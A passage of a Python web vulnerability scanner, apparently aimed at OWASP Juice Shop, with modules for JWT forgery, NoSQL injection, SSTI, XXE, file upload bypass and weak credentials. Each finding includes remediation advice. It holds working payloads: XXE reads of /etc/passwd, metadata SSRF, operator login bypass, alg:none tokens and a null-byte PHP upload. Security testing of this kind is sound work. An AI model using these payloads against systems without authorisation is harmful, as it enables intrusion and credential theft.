    alg = header_data.get("alg", "").upper()
    if alg in ("HS256", "HS384", "HS512"):
        signing_input = f"{parts[0]}.{parts[1]}".encode()
        try:
            expected = _b64d(parts[2])
        except Exception:
            return

        hash_fn = {"HS256": hashlib.sha256, "HS384": hashlib.sha384,
                   "HS512": hashlib.sha512}.get(alg, hashlib.sha256)

        for secret in JWT_WEAK_SECRETS:
            computed = hmac.new(secret.encode(), signing_input, hash_fn).digest()
            if hmac.compare_digest(computed, expected):
                yield _finding("jwt", "weak_jwt_secret", "critical",
                    f"JWT Signed with Weak Secret: '{secret}'",
                    f"JWT HMAC secret is a common weak value. "
                    f"Attacker can forge tokens for any user ID/role.",
                    f"Algorithm: {alg}\nCracked secret: {secret}",
                    target, True,
                    "Use a cryptographically random secret of ≥256 bits. "
                    "Rotate the secret immediately and invalidate all existing tokens.",
                    confidence="high")
                return

        # kid path traversal
        kid = header_data.get("kid", "")
        if kid:
            for kid_payload in JWT_KID_PAYLOADS[:2]:
                tampered_header = dict(header_data)
                tampered_header["kid"] = kid_payload
                new_header = base64.urlsafe_b64encode(
                    json.dumps(tampered_header).encode()
                ).rstrip(b"=").decode()
                # Use empty string as secret (matches /dev/null content)
                empty_sig = hmac.new(b"", f"{new_header}.{parts[1]}".encode(),
                                      hashlib.sha256).digest()
                new_sig = base64.urlsafe_b64encode(empty_sig).rstrip(b"=").decode()
                new_token = f"{new_header}.{parts[1]}.{new_sig}"
                for path in ["/api/me", "/api/user"]:
                    try:
                        r = await client.get(target + path,
                                              headers={"Authorization": f"Bearer {new_token}"},
                                              timeout=8)
                        if r.status_code == 200 and len(r.text) > 30:
                            yield _finding("jwt", "kid_path_traversal", "critical",
                                "JWT 'kid' Path Traversal",
                                f"Server accepted JWT with kid={kid_payload}. "
                                f"Attacker can control the key used for signature verification.",
                                f"kid: {kid_payload}\nPath: {target + path}\nStatus: 200",
                                target + path, True,
                                "Validate kid values against an allowlist. "
                                "Never use kid values as file system paths.",
                                confidence="medium")
                    except httpx.HTTPError:
                        pass

    # Test alg:none attack — forge JWT with algorithm set to none
    auth_header = client.headers.get("Authorization", "")
    if auth_header.startswith("Bearer "):
        token_for_none = auth_header[7:]
        parts_none = token_for_none.split(".")
        if len(parts_none) == 3:
            try:
                import base64 as _b64
                header_decoded = _b64.b64decode(parts_none[0] + "==").decode()
                header_obj = json.loads(header_decoded)
                original_alg = header_obj.get("alg", "HS256")

                for none_variant in JWT_ALG_NONE_VARIANTS[:4]:
                    forged_header = json.dumps({"typ": "JWT", "alg": none_variant}).encode()
                    forged_header_b64 = _b64.urlsafe_b64encode(forged_header).rstrip(b"=").decode()

                    # Keep original payload, empty signature
                    forged_token = f"{forged_header_b64}.{parts_none[1]}."

                    test_endpoints = ["/rest/user/whoami", "/api/me", "/api/user", "/api/Users"]
                    for ep in test_endpoints[:2]:
                        try:
                            r = await client.get(target + ep,
                                headers={"Authorization": f"Bearer {forged_token}"},
                                timeout=8)
                            if r.status_code == 200 and len(r.content) > 20:
                                try:
                                    data = r.json()
                                    if any(k in str(data) for k in ["email", "username", "id", "role"]):
                                        yield _finding("jwt", "jwt_alg_none",
                                            "critical",
                                            f"JWT Algorithm Confusion — alg:none Accepted",
                                            f"The server accepted a JWT with `alg:{none_variant}` (no signature). "
                                            f"Any user can forge tokens for any account without knowing the secret.",
                                            f"Original alg: {original_alg}\nForged alg: {none_variant}\n"
                                            f"Endpoint: {target + ep}\nResponse: {str(data)[:200]}",
                                            target + ep, True,
                                            "Explicitly whitelist allowed algorithms server-side (HS256, RS256). "
                                            "Reject tokens with alg:none. Use a JWT library that disallows none by default.",
                                            confidence="high")
                                        break
                                except Exception:
                                    pass
                        except httpx.HTTPError:
                            pass
                    await asyncio.sleep(0)
            except Exception:
                pass


# ── Module: Open Redirect ─────────────────────────────────────────────────────

async def _module_redirect(target: str, client: httpx.AsyncClient) -> AsyncGenerator[dict, None]:
    for param in REDIRECT_PARAMS[:10]:
        for payload in REDIRECT_PAYLOADS[:4]:
            test_url = f"{target}?{param}={payload}"
            try:
                r = await client.get(test_url, follow_redirects=False, timeout=8)
                loc = r.headers.get("location", "")
                if "evil.example.com" in loc or "javascript:" in loc:
                    yield _finding("redirect", "open_redirect", "high",
                        f"Open Redirect via '{param}' parameter",
                        f"Parameter `{param}` redirects to attacker-controlled URL `{payload}`. "
                        f"Can be chained with OAuth flows for account takeover.",
                        f"URL: {test_url}\nLocation: {loc}",
                        test_url, True,
                        "Validate redirect targets against an allowlist. "
                        "Reject absolute URLs or URLs with different origins.",
                        confidence="high")
                    return
            except httpx.HTTPError:
                pass
            await asyncio.sleep(0)


# ── Module: Auth Bypass ───────────────────────────────────────────────────────

async def _module_auth_bypass(target: str, client: httpx.AsyncClient,
                               spa_fallback_size: int = 0) -> AsyncGenerator[dict, None]:
    # ── Sensitive file exposure (SPA-aware) ───────────────────────────────────
    for path in COMMON_SENSITIVE_PATHS[:20]:
        url = target + path
        try:
            r = await client.get(url, timeout=6)
            # Skip if this is the SPA returning its index.html for all routes
            if _is_spa_fallback(r, spa_fallback_size):
                continue
            if r.status_code == 200 and len(r.text) > 50:
                # Verify the content actually looks like a sensitive file
                # not just a generic application response
                body = r.text
                ct = r.headers.get("content-type", "")
                is_html = "text/html" in ct

                # If response is HTML and not a known non-SPA format, skip
                if is_html and not any(kw in body.lower() for kw in
                                        ["<?php", "[core]", "[remote", "DB_PASSWORD",
                                         "app_key", "secret_key", "api_key", "password="]):
                    continue

                sev = "critical" if any(kw in body for kw in
                                         ["password", "secret", "api_key", "private_key",
                                          "token", "aws_access", "DB_PASSWORD", "APP_KEY"]) else "high"
                yield _finding("auth_bypass", "sensitive_file_exposure", sev,
                    f"Sensitive File Exposed: {path}",
                    f"File {path} is publicly accessible (HTTP 200) and contains "
                    f"{'credentials or secrets' if sev == 'critical' else 'potentially sensitive configuration'}.",
                    f"URL: {url}\nContent-Type: {ct}\nSize: {len(body)} bytes\nSnippet: {body[:300]}",
                    url, True,
                    f"Block access to {path} in your web server configuration. "
                    f"Remove sensitive files from the webroot.",
                    confidence="high")
        except httpx.HTTPError:
            pass
        await asyncio.sleep(0)

    # ── Monitoring / metrics endpoint exposure ────────────────────────────────
    # Prometheus /metrics, Spring actuator, debug endpoints — expose server
    # internals including CPU, memory, request rates, environment variables.
    for path, indicators in MONITORING_PATHS:
        url = target + path
        try:
            r = await client.get(url, timeout=6)
            if _is_spa_fallback(r, spa_fallback_size):
                continue
            if r.status_code == 200:
                body = r.text
                matched = [ind for ind in indicators if ind.lower() in body.lower()]
                if matched:
                    sev = "critical" if "env" in path or "password" in body.lower() else "high"
                    yield _finding("auth_bypass", "monitoring_endpoint_exposed", sev,
                        f"Monitoring/Metrics Endpoint Publicly Accessible: {path}",
                        f"Endpoint {path} is publicly accessible and returns server metrics "
                        f"or configuration data. Indicators found: {matched}. "
                        f"Exposes server internals to unauthenticated users.",
                        f"URL: {url}\nIndicators matched: {matched}\nSnippet: {body[:400]}",
                        url, True,
                        f"Restrict {path} to internal networks or authenticated admin users. "
                        f"Add firewall rules to block public access to monitoring endpoints.",
                        confidence="high")
        except httpx.HTTPError:
            pass
        await asyncio.sleep(0)

    # ── FTP/file directory listing ────────────────────────────────────────────
    ftp_like_paths = ["/ftp", "/files", "/uploads", "/backup", "/static/files"]
    for path in ftp_like_paths:
        url = target + path
        try:
            r = await client.get(url, timeout=6)
            if _is_spa_fallback(r, spa_fallback_size):
                continue
            body = r.text
            ct = r.headers.get("content-type", "")
            if r.status_code == 200:
                # Look for directory listing indicators
                if any(ind in body for ind in ["Index of /", "Directory listing", "<a href=\".."]):
                    yield _finding("auth_bypass", "directory_listing", "high",
                        f"Directory Listing Enabled: {path}",
                        f"Path {path} shows a directory listing, exposing all files.",
                        f"URL: {url}\nSnippet: {body[:300]}",
                        url, True,
                        "Disable directory listing in web server config. Add index.html to all directories.",
                        confidence="high")
                # Look for downloadable sensitive file links
                elif any(ext in body.lower() for ext in [".md\"", ".pdf\"", ".sql\"", ".bak\"", ".zip\""]):
                    yield _finding("auth_bypass", "file_download_exposure", "high",
                        f"Sensitive File Links Accessible: {path}",
                        f"Path {path} contains links to potentially sensitive files.",
                        f"URL: {url}\nSnippet: {body[:300]}",
                        url, True,
                        "Restrict access to file directories. Move sensitive files outside webroot.",
                        confidence="medium")
        except httpx.HTTPError:
            pass
        await asyncio.sleep(0)

    # ── X-Forwarded-For bypass ────────────────────────────────────────────────
    for path in ["/admin", "/api/admin", "/admin/users"]:
        url = target + path
        try:
            r_plain = await client.get(url, timeout=6)
            r_xff = await client.get(url, headers={"X-Forwarded-For": "127.0.0.1"}, timeout=6)
            if (not _is_spa_fallback(r_plain, spa_fallback_size) and
                    not _is_spa_fallback(r_xff, spa_fallback_size)):
                if r_plain.status_code in (401, 403) and r_xff.status_code == 200:
                    yield _finding("auth_bypass", "xff_bypass", "high",
                        f"Auth Bypass via X-Forwarded-For on {path}",
                        f"X-Forwarded-For: 127.0.0.1 header grants access to {path} "
                        f"that is otherwise blocked.",
                        f"Without header: {r_plain.status_code}, With header: {r_xff.status_code}",
                        url, True,
                        "Never use X-Forwarded-For for access control. "
                        "Use authentication tokens and server-side session validation.",
                        confidence="high")
        except httpx.HTTPError:
            pass
        await asyncio.sleep(0)


# ── Module: Takeover Detection ────────────────────────────────────────────────

async def _module_takeover(target: str, client: httpx.AsyncClient) -> AsyncGenerator[dict, None]:
    fingerprints = [
        ("There isn't a GitHub Pages site here", "GitHub Pages", "critical"),
        ("NoSuchBucket", "AWS S3", "critical"),
        ("The specified bucket does not exist", "AWS S3", "critical"),
        ("No Such Account", "Heroku", "critical"),
        ("Repository not found", "GitHub/Bitbucket", "critical"),
        ("This page is in Maintenance Mode", "Webflow", "high"),
        ("Fastly error: unknown domain", "Fastly CDN", "high"),
        ("The request could not be satisfied", "CloudFront", "high"),
        ("Domain not configured", "Netlify", "high"),
        ("Unrecognized domain", "Surge.sh", "high"),
        ("project not found", "Firebase/Vercel", "high"),
        ("There is no app configured at that hostname", "Heroku", "critical"),
    ]
    try:
        r = await client.get(target, timeout=10)
        body_lower = r.text.lower()
        server = r.headers.get("server", "").lower()
        for fp, service, severity in fingerprints:
            if fp.lower() in body_lower or fp.lower() in server:
                yield _finding("takeover", "service_takeover", severity,
                    f"Potential {service} Subdomain/Service Takeover",
                    f"Response contains `{fp}` — indicates an unclaimed {service} resource. "
                    f"Attacker can claim this service and host malicious content on this domain.",
                    f"Fingerprint: {fp}\nStatus: {r.status_code}",
                    target, True,
                    f"Claim or decommission the unclaimed {service} resource. "
                    f"Remove CNAME records pointing to unclaimed services.",
                    confidence="high")
                return
    except httpx.HTTPError:
        pass


# ── Module: NoSQL Injection ───────────────────────────────────────────────────

async def _module_nosql(target: str, client: httpx.AsyncClient,
                        forms: list[dict]) -> AsyncGenerator[dict, None]:
    """Test for NoSQL injection via MongoDB operator injection."""

    # Test REST endpoints with operator injection in URL params
    for path, param in NOSQL_REST_ENDPOINTS:
        url = target + path
        for payload in NOSQL_URL_PAYLOADS[:3]:
            try:
                r = await client.get(f"{url}?{param}{payload}", timeout=8)
                if r.status_code == 200 and len(r.content) > 100:
                    try:
                        data = r.json()
                        # If we get a list of items back with operator injection, likely NoSQL injection
                        items = data if isinstance(data, list) else data.get("data", [])
                        if isinstance(items, list) and len(items) > 0:
                            yield _finding("nosql", "nosql_url_operator", "high",
                                f"NoSQL Injection via URL Parameter: {path}",
                                f"MongoDB operator `{payload}` in `{param}` returned {len(items)} records. "
                                f"Operator injection may allow unauthorized data access or auth bypass.",
                                f"URL: {url}?{param}{payload}\nRecords returned: {len(items)}\nSample: {str(items[0])[:200]}",
                                url, True,
                                "Validate and sanitize all inputs. Use allowlists for query params. "
                                "Disable MongoDB operator injection with schema validation.",
                                confidence="medium")
                            break
                    except Exception:
                        pass
            except httpx.HTTPError:
                pass
            await asyncio.sleep(0)

    # Test REST login endpoints with JSON operator injection
    rest_login_paths = [
        "/rest/user/login", "/api/auth/login", "/api/login",
        "/api/v1/auth/login", "/auth/login",
    ]
    for path in rest_login_paths[:4]:
        url = target + path
        for op_payload in [{"$gt": ""}, {"$ne": None}, {"$regex": ".*"}]:
            try:
                payload = {"email": op_payload, "password": op_payload}
                r = await client.post(url, json=payload, timeout=8)
                if r.status_code in (200, 201):
                    try:
                        data = r.json()
                        if any(k in str(data) for k in ["token", "access_token", "authentication", "user"]):
                            yield _finding("nosql", "nosql_login_bypass", "critical",
                                "NoSQL Injection Auth Bypass via REST Login",
                                f"MongoDB operator `{op_payload}` in login payload bypassed authentication — "
                                f"a token was returned without valid credentials.",
                                f"URL: {url}\nPayload: {payload}\nResponse keys: {list(data.keys())[:5]}",
                                url, True,
                                "Use MongoDB schema validation to reject operator objects in string fields. "
                                "Never pass raw request body objects directly to database queries.",
                                confidence="high")
                            break
                    except Exception:
                        pass
            except httpx.HTTPError:
                pass
            await asyncio.sleep(0)

    # Test for NoSQL injection in form POST endpoints
    for form in forms[:3]:
        if form.get("method") != "POST":
            continue
        inputs = form.get("inputs", [])
        user_fields = [i for i in inputs if any(k in i.lower() for k in ["user", "email", "login"])]
        if not user_fields:
            continue
        # Try sending operator as value — some frameworks parse [$gt]= in forms
        for field in user_fields[:1]:
            try:
                form_data = {inp: "[$ne]=invalid" if inp == field else "test" for inp in inputs}
                r = await client.post(form["action"], data=form_data, timeout=8)
                if r.status_code == 200 and len(r.content) > 100:
                    yield _finding("nosql", "nosql_form_injection", "medium",
                        "Potential NoSQL Injection via Form Parameter",
                        f"Form at {form['action']} may accept MongoDB operators via `{field}` field.",
                        f"Form: {form['action']}\nField: {field}\nStatus: {r.status_code}",
                        form["action"], False,
                        "Validate all form inputs server-side. Reject operator-like strings in string fields.",
                        confidence="low")
            except httpx.HTTPError:
                pass
        await asyncio.sleep(0)


# ── Module: SSTI ─────────────────────────────────────────────────────────────

async def _module_ssti(target: str, client: httpx.AsyncClient,
                       forms: list[dict]) -> AsyncGenerator[dict, None]:
    """Detect Server-Side Template Injection in forms and URL params."""

    # Test URL parameters
    ssti_params = ["name", "q", "search", "message", "template", "subject", "input"]
    for param in ssti_params[:4]:
        for payload in SSTI_PAYLOADS[:5]:
            try:
                r = await client.get(f"{target}?{param}={payload}", timeout=8)
                # Check for math result indicating SSTI
                if "49" in r.text and payload == "{{7*7}}":
                    yield _finding("ssti", "ssti_reflected_math", "critical",
                        f"Server-Side Template Injection via '{param}' URL Parameter",
                        f"Payload `{{{{7*7}}}}` rendered as `49` in the response. "
                        f"The server is executing template expressions — this enables RCE.",
                        f"URL: {target}?{param}={payload}\nEvidence: '49' found in response",
                        target, True,
                        "Never render user input through a template engine. "
                        "Use sandboxed template environments or render user data as literals.",
                        confidence="high")
                    return
                if "7777777" in r.text and payload == "{{7*'7'}}":
                    yield _finding("ssti", "ssti_jinja2_string_mul", "critical",
                        "Jinja2 SSTI Confirmed via String Multiplication",
                        f"Payload `{{{{7*'7'}}}}` rendered as `7777777`. Jinja2 template injection confirmed.",
                        f"URL: {target}?{param}={payload}\nEvidence: '7777777' in response",
                        target, True,
                        "Sanitize all user input before passing to template rendering. "
                        "Use Jinja2's SandboxedEnvironment.",
                        confidence="high")
                    return
            except httpx.HTTPError:
                pass
            await asyncio.sleep(0)

    # Test POST forms
    for form in forms[:5]:
        inputs = form.get("inputs", [])
        action = form.get("action", "")
        if not action:
            continue
        for field in SSTI_TEST_FIELDS:
            if field not in inputs:
                continue
            for payload in SSTI_PAYLOADS[:3]:
                try:
                    form_data = {inp: payload if inp == field else "test" for inp in inputs}
                    r = await client.post(action, data=form_data, timeout=8)
                    if "49" in r.text and payload == "{{7*7}}":
                        yield _finding("ssti", "ssti_form_injection", "critical",
                            f"Server-Side Template Injection in Form Field '{field}'",
                            f"Payload `{{{{7*7}}}}` rendered as `49` in response from {action}. "
                            f"The server evaluates template expressions in user input.",
                            f"Form: {action}\nField: {field}\nEvidence: '49' in response",
                            action, True,
                            "Treat all user input as data, never as template code. "
                            "Use context-aware escaping in templates.",
                            confidence="high")
                        return
                except httpx.HTTPError:
                    pass
                await asyncio.sleep(0)

    # Test Juice Shop specific search endpoint
    try:
        r = await client.get(f"{target}/rest/products/search?q={{{{7*7}}}}", timeout=8)
        if "49" in r.text:
            yield _finding("ssti", "ssti_search_endpoint", "critical",
                "SSTI in Search Endpoint",
                "Template expression `{{7*7}}` evaluated to `49` in search response.",
                f"URL: {target}/rest/products/search?q={{{{7*7}}}}\nEvidence: '49' in response",
                target + "/rest/products/search", True,
                "Escape template expressions in all query parameters before rendering.",
                confidence="high")
    except httpx.HTTPError:
        pass


# ── Module: XXE ───────────────────────────────────────────────────────────────

async def _module_xxe(target: str, client: httpx.AsyncClient) -> AsyncGenerator[dict, None]:
    """Test XML External Entity injection on XML-accepting endpoints."""

    xml_endpoints = [
        "/b2b/v2/orders",
        "/api/xml",
        "/api/v1/xml",
        "/import",
        "/api/import",
        "/upload",
    ]

    order_xxe_payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<orders>
  <order>
    <quantity>1</quantity>
    <item>&xxe;</item>
    <address>test</address>
  </order>
</orders>"""

    xxe_ssrf_payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<order><quantity>&xxe;</quantity></order>"""

    for path in xml_endpoints:
        url = target + path
        for payload, name in [
            (order_xxe_payload, "file_read"),
            (xxe_ssrf_payload, "ssrf"),
        ]:
            try:
                r = await client.post(url,
                    content=payload.encode(),
                    headers={"Content-Type": "application/xml"},
                    timeout=10)
                body = r.text
                # Check for file read
                if any(ind in body for ind in ["root:", "/bin/bash", "/sbin/nologin"]):
                    yield _finding("xxe", "xxe_file_read", "critical",
                        f"XXE — Local File Read via {path}",
                        f"XML External Entity payload read /etc/passwd contents. "
                        f"Full server filesystem access is possible.",
                        f"Endpoint: {url}\nEvidence: /etc/passwd content in response\n"
                        f"Snippet: {body[:300]}",
                        url, True,
                        "Disable external entity processing in XML parsers. "
                        "Use XMLConstants.FEATURE_SECURE_PROCESSING in Java. "
                        "Set libxml_disable_entity_loader(true) in PHP.",
                        confidence="high")
                    break
                # Check for SSRF via XXE
                if any(ind in body for ind in ["ami-id", "instance-id", "computeMetadata"]):
                    yield _finding("xxe", "xxe_ssrf", "critical",
                        f"XXE SSRF — Cloud Metadata Access via {path}",
                        f"XXE payload triggered SSRF to cloud metadata service.",
                        f"Endpoint: {url}\nEvidence: cloud metadata in response",
                        url, True,
                        "Disable external entities. Block access to internal metadata endpoints.",
                        confidence="high")
                # Check for XML parsing error (server accepts XML)
                if r.status_code != 404 and any(ind in body.lower() for ind in
                        ["xml", "entity", "parsing", "malformed", "syntax error"]):
                    yield _finding("xxe", "xxe_parser_exposed", "medium",
                        f"XML Parser Exposed at {path}",
                        f"Endpoint accepts XML input — may be vulnerable to XXE. "
                        f"XML parsing errors detected in response.",
                        f"Endpoint: {url}\nStatus: {r.status_code}\nResponse: {body[:200]}",
                        url, True,
                        "Configure XML parser to disallow DOCTYPE declarations and external entities. "
                        "Validate and sanitize all XML input.",
                        confidence="low")
                    break
            except httpx.HTTPError:
                pass
            await asyncio.sleep(0)

    # Test the Juice Shop B2B endpoint specifically
    juiceshop_b2b = target + "/b2b/v2/orders"
    try:
        r = await client.post(juiceshop_b2b,
            content=order_xxe_payload.encode(),
            headers={"Content-Type": "application/xml", "X-User-Email": "admin@juice-sh.op"},
            timeout=10)
        if r.status_code not in (404, 405):
            body = r.text
            if any(ind in body for ind in XXE_INDICATORS):
                yield _finding("xxe", "xxe_b2b_confirmed", "critical",
                    "XXE Confirmed in B2B Order API",
                    f"B2B XML order endpoint parsed external entities. "
                    f"Server file contents were returned in the response.",
                    f"Endpoint: {juiceshop_b2b}\nEvidence: {body[:300]}",
                    juiceshop_b2b, True,
                    "Disable external XML entity processing on the order ingestion endpoint.",
                    confidence="high")
            elif r.status_code in (200, 201, 400):
                yield _finding("xxe", "xxe_b2b_accepts_xml", "info",
                    "B2B XML Endpoint Active — Test Manually for XXE",
                    f"POST {juiceshop_b2b} accepts XML input (status {r.status_code}). "
                    f"Manually verify XXE with DOCTYPE/entity payloads.",
                    f"Endpoint: {juiceshop_b2b}\nStatus: {r.status_code}",
                    juiceshop_b2b, False,
                    "Audit XML parsing configuration for external entity handling.",
                    confidence="low")
    except httpx.HTTPError:
        pass


# ── Module: File Upload ────────────────────────────────────────────────────────

async def _module_file_upload(target: str, client: httpx.AsyncClient,
                               spa_fallback_size: int = 0) -> AsyncGenerator[dict, None]:
    """Test file upload endpoints for extension bypass, size limits, and XXE in SVG."""
    import io

    for path in FILE_UPLOAD_PATHS:
        url = target + path
        # First probe to check endpoint exists
        try:
            probe = await client.get(url, timeout=6)
            if _is_spa_fallback(probe, spa_fallback_size) or probe.status_code == 404:
                continue
        except httpx.HTTPError:
            pass

        # Test 1: Upload oversized file (>100 KB) — Juice Shop Upload Size challenge
        oversized_content = b"A" * 150000  # 150 KB
        try:
            files = {"file": ("test.pdf", io.BytesIO(oversized_content), "application/pdf")}
            r = await client.post(url, files=files, timeout=10)
            if r.status_code in (200, 201):
                yield _finding("file_upload", "upload_size_bypass", "medium",
                    f"File Upload Size Limit Not Enforced: {path}",
                    f"Uploaded a 150 KB file to {path} successfully (got {r.status_code}). "
                    f"Server does not enforce file size limits.",
                    f"Endpoint: {url}\nFile size: 150 KB\nStatus: {r.status_code}",
                    url, True,
                    "Enforce file size limits server-side. Reject files exceeding the allowed size.",
                    confidence="medium")
        except httpx.HTTPError:
            pass
        await asyncio.sleep(0)

        # Test 2: Upload non-PDF/ZIP file — Juice Shop Upload Type challenge
        try:
            files = {"file": ("test.xml", io.BytesIO(b"<test>hello</test>"), "text/xml")}
            r = await client.post(url, files=files, timeout=10)
            if r.status_code in (200, 201):
                yield _finding("file_upload", "upload_type_bypass", "medium",
                    f"File Type Restriction Bypassable: {path}",
                    f"Uploaded a `.xml` file (not pdf/zip) and got status {r.status_code}. "
                    f"Server does not validate file type server-side.",
                    f"Endpoint: {url}\nFile: test.xml\nStatus: {r.status_code}",
                    url, True,
                    "Validate file type by content (magic bytes), not just extension or MIME type. "
                    "Use a file type allowlist enforced server-side.",
                    confidence="medium")
        except httpx.HTTPError:
            pass
        await asyncio.sleep(0)

        # Test 3: SVG XXE via file upload
        svg_xxe = b"""<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
<text font-size="16" x="0" y="16">&xxe;</text></svg>"""
        try:
            files = {"file": ("test.svg", io.BytesIO(svg_xxe), "image/svg+xml")}
            r = await client.post(url, files=files, timeout=10)
            if any(ind in r.text for ind in ["root:", "/bin/bash", "/sbin/nologin"]):
                yield _finding("file_upload", "upload_svg_xxe", "critical",
                    f"XXE via SVG File Upload at {path}",
                    f"SVG file with XXE payload returned /etc/passwd contents. "
                    f"Full server filesystem access via file upload.",
                    f"Endpoint: {url}\nEvidence: /etc/passwd in response\nSnippet: {r.text[:200]}",
                    url, True,
                    "Sanitize SVG uploads. Disable XML external entities before processing uploads. "
                    "Use server-side SVG sanitization library.",
                    confidence="high")
        except (httpx.HTTPError, Exception):
            pass
        await asyncio.sleep(0)

        # Test 4: Null byte extension bypass
        try:
            files = {"file": ("test.php\x00.pdf", io.BytesIO(b"<?php echo 'pwned'; ?>"), "application/pdf")}
            r = await client.post(url, files=files, timeout=10)
            if r.status_code in (200, 201) and "pwned" in r.text:
                yield _finding("file_upload", "upload_null_byte_rce", "critical",
                    f"Null Byte Extension Bypass — Possible RCE at {path}",
                    f"Uploaded PHP file with null byte bypass (`test.php\\x00.pdf`) — "
                    f"server executed PHP and returned 'pwned'.",
                    f"Endpoint: {url}\nFile: test.php\\x00.pdf\nResponse: {r.text[:100]}",
                    url, True,
                    "Sanitize file names server-side. Strip null bytes before processing. "
                    "Never execute uploaded files.",
                    confidence="high")
        except (httpx.HTTPError, Exception):
            pass
        await asyncio.sleep(0)


# ── Module: Broken Authentication ─────────────────────────────────────────────

async def _module_broken_auth(target: str, client: httpx.AsyncClient) -> AsyncGenerator[dict, None]:
    """Test for weak/default credentials and broken authentication mechanisms."""

    login_endpoints = [
        ("/rest/user/login", "email", "password"),
        ("/api/login", "username", "password"),
        ("/api/auth/login", "email", "password"),
        ("/api/v1/auth/login", "email", "password"),
        ("/api/users/login", "email", "password"),
        ("/login", "email", "password"),
    ]

    found_login = None

    for path, user_field, pass_field in login_endpoints[:3]:
        url = target + path
        # Quick probe
        try:
            probe = await client.post(url, json={user_field: "probe@test.com", pass_field: "wrongpassword"}, timeout=6)
            if probe.status_code == 404:
                continue
            found_login = (url, user_field, pass_field)
            break
        except httpx.HTTPError:
            continue

    if not found_login:
        return

    url, user_field, pass_field = found_login

    for username, password in WEAK_CREDENTIAL_PAIRS[:12]:
        try:
            r = await client.post(url, json={user_field: username, pass_field: password}, timeout=8)
            if r.status_code in (200, 201):
                try:
                    data = r.json()
                    if any(k in str(data) for k in ["token", "access_token", "authentication", "session"]):
                        yield _finding("broken_auth", "weak_default_credentials", "critical",
                            f"Weak/Default Credentials Accepted: {username}",
                            f"Login succeeded with `{username}` / `{password}`. "
                            f"Default or weak credentials are accepted by the application.",
                            f"Endpoint: {url}\nUsername: {username}\nPassword: {password}\n"
                            f"Response keys: {list(data.keys())[:5]}",
                            url, True,
                            "Enforce strong password policy. Rotate all default credentials. "
                            "Implement account lockout after failed attempts.",
                            confidence="high")
                        break  # found one set, move on
                except Exception:
                    pass
        except httpx.HTTPError:
            pass
        await asyncio.sleep(0)

    # Test for missing account lockout (brute-force protection)
    failed_count = 0
    test_user = WEAK_CREDENTIAL_PAIRS[0][0]
    for i in range(5):
        try:
            r = await client.post(url, json={user_field: test_user, pass_field: f"wrongpass{i}"}, timeout=6)
            if r.status_code not in (429, 423, 403):
                failed_count += 1
        except httpx.HTTPError:
            break
        await asyncio.sleep(0.1)

    if failed_count >= 5:
        yield _finding("broken_auth", "no_lockout", "medium",
            "No Account Lockout / Rate Limiting Detected",
            f"Sent 5 consecutive failed login attempts to {url} without triggering "
            f"lockout (429) or account lock (423). Brute-force attacks are possible.",
            f"Endpoint: {url}\n5 failed attempts all returned non-429/423 responses",
            url, True,
            "Implement account lockout or exponential backoff after N failed attempts. "
            "Use CAPTCHA for login endpoints. Consider IP-based rate limiting.",
            confidence="medium")

    # Test password reset — verify link expiry
    reset_paths = ["/forgot-password", "/api/forgot-password", "/rest/user/reset-password"]
    for path in reset_paths[:2]:
        reset_url = target + path
        try:
            r = await client.post(reset_url, json={"email": test_user}, timeout=6)
            if r.status_code in (200, 201, 204):
                yield _finding("broken_auth", "password_reset_active", "info",
                    f"Password Reset Endpoint Active: {path}",
                    f"POST {reset_url} returned {r.status_code} — password reset mechanism is active. "
                    f"Verify reset tokens expire, are single-use, and reset emails go to correct address only.",
                    f"Endpoint: {reset_url}\nStatus: {r.status_code}",
                    reset_url, False,
                    "Ensure reset tokens: (1) expire within 15 minutes, (2) are invalidated after use, "
                    "(3) are cryptographically random, (4) sent only to the registered email.",
                    confidence="low")
                break
        except httpx.HTTPError:
            pass


# ── Module: Information Disclosure ───────────────────────────────────────────

async def _module_info_disclosure(target: str, client: httpx.AsyncClient,
                                   spa_fallback_size: int = 0) -> AsyncGenerator[dict, None]:
    """Probe for exposed sensitive files: FTP dir, backups, .env, git, logs."""

    for path in INFO_DISCLOSURE_PATHS:
        url = target + path
        try:
            r = await client.get(url, timeout=8)
            if _is_spa_fallback(r, spa_fallback_size):
                continue
            if r.status_code == 200 and len(r.content) > 20:
                body = r.text
                body_lower = body.lower()

                # Check for FTP directory listing
                if path in ("/ftp", "/ftp/"):
                    if any(f in body for f in ["acquisitions", "package.json", "legal", "bak", "eastere"]):
                        yield _finding("info_disclosure", "ftp_directory_exposed", "high",
                            "FTP Directory Listing Exposed",
                            f"GET {url} returns a directory listing with sensitive files. "
                            f"Confidential documents, backups, and developer files are accessible.",
                            f"URL: {url}\nFiles visible: {body[:400]}",
                            url, True,
                            "Remove the /ftp directory from web root or restrict access. "
                            "Never store sensitive documents in publicly accessible directories.",
                            confidence="high")
                    continue

                # Check for specific sensitive file indicators
                if path.endswith(".bak") or path.endswith("~") or path.endswith(".old"):
                    yield _finding("info_disclosure", "backup_file_exposed", "high",
                        f"Backup/Source File Exposed: {path}",
                        f"Backup file at {url} is publicly accessible. May contain source code, "
                        f"credentials, or configuration secrets.",
                        f"URL: {url}\nSize: {len(r.content)} bytes\nPreview: {body[:200]}",
                        url, True,
                        "Remove backup files from the web root. Use .gitignore and deployment pipelines "
                        "to ensure backup files are never deployed.",
                        confidence="high")
                    continue

                if path == "/.env" or "/.env." in path:
                    sensitive_keys = [k for k in
                        ["DB_PASSWORD", "SECRET_KEY", "API_KEY", "DATABASE_URL", "REDIS_URL",
                         "SMTP_PASSWORD", "AWS_SECRET", "STRIPE_KEY"]
                        if k in body or k.lower() in body_lower]
                    yield _finding("info_disclosure", "env_file_exposed", "critical",
                        ".env File Exposed — Credentials Leaked",
                        f"The .env file at {url} is publicly accessible. "
                        + (f"Detected sensitive keys: {sensitive_keys}." if sensitive_keys else "May contain secrets."),
                        f"URL: {url}\nSensitive keys found: {sensitive_keys}\nPreview: {body[:300]}",
                        url, True,
                        "Never commit or deploy .env files to web-accessible directories. "
                        "Use environment variables injected at runtime via secrets management.",
                        confidence="high")
                    continue

                if path in ("/.git/config", "/.git/HEAD", "/.git/COMMIT_EDITMSG"):
                    yield _finding("info_disclosure", "git_exposed", "high",
